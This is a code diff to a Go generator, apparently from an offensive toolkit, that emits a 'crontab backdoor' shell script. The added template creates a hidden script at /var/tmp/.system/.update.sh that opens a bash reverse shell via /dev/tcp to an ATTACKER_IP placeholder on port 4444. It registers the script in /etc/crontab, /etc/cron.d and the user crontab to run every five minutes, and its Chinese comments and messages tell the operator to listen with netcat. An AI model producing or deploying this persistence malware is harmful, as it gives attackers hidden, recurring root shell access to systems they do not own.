@@ -27,27 +27,39 @@ func (c *CrontabBackdoor) GeneratePayload(outDir string) error {
 # Crontab Backdoor Generator
 # Generated at: {{.Timestamp}}
 
-SHELL_CMD="{{.Command}}"
-SCHEDULE="{{.Schedule}}"
-BACKUP_PATH="{{.BackupPath}}"
+# 配置信息
+ATTACKER_IP="YOUR_IP"
+ATTACKER_PORT="4444"
+SCHEDULE="*/5 * * * *"
 
-# Backup original crontab
-crontab -l > $BACKUP_PATH 2>/dev/null
+# 创建反弹shell命令
+SHELL_CMD="bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1"
 
-# Add persistence methods
-echo "$SCHEDULE $SHELL_CMD" >> /etc/crontab
-(crontab -l 2>/dev/null; echo "$SCHEDULE $SHELL_CMD") | crontab -
+# 创建隐藏目录和后门文件
+HIDE_DIR="/var/tmp/.system"
+BACKDOOR_SCRIPT="$HIDE_DIR/.update.sh"
+mkdir -p $HIDE_DIR
 
-# Add to additional locations for persistence
-echo "$SCHEDULE root $SHELL_CMD" >> /etc/cron.d/system-update
-echo "$SCHEDULE root $SHELL_CMD" >> /etc/cron.daily/system-update
+# 创建后门脚本
+cat > $BACKDOOR_SCRIPT << 'EOL'
+#!/bin/bash
+bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1
+EOL
 
-# Make sure cron is running
+chmod +x $BACKDOOR_SCRIPT
+
+# 添加到多个位置实现持久化
+echo "$SCHEDULE root $BACKDOOR_SCRIPT" >> /etc/crontab
+echo "$SCHEDULE root $BACKDOOR_SCRIPT" >> /etc/cron.d/system-update
+(crontab -l 2>/dev/null; echo "$SCHEDULE $BACKDOOR_SCRIPT") | crontab -
+
+# 重启cron服务
 service cron reload 2>/dev/null || service crond reload 2>/dev/null
 
-# Cleanup
-echo "[+] Crontab backdoor installed"
-echo "[+] Original crontab backed up to $BACKUP_PATH"
+echo "[+] Crontab后门安装完成"
+echo "[+] 反弹Shell将每5分钟连接到 $ATTACKER_IP:$ATTACKER_PORT"
+echo "[+] 在攻击机器上运行以下命令监听连接:"
+echo "    nc -lvnp $ATTACKER_PORT"
 `
 
 	scriptPath := filepath.Join(outDir, "crontab_backdoor.sh")
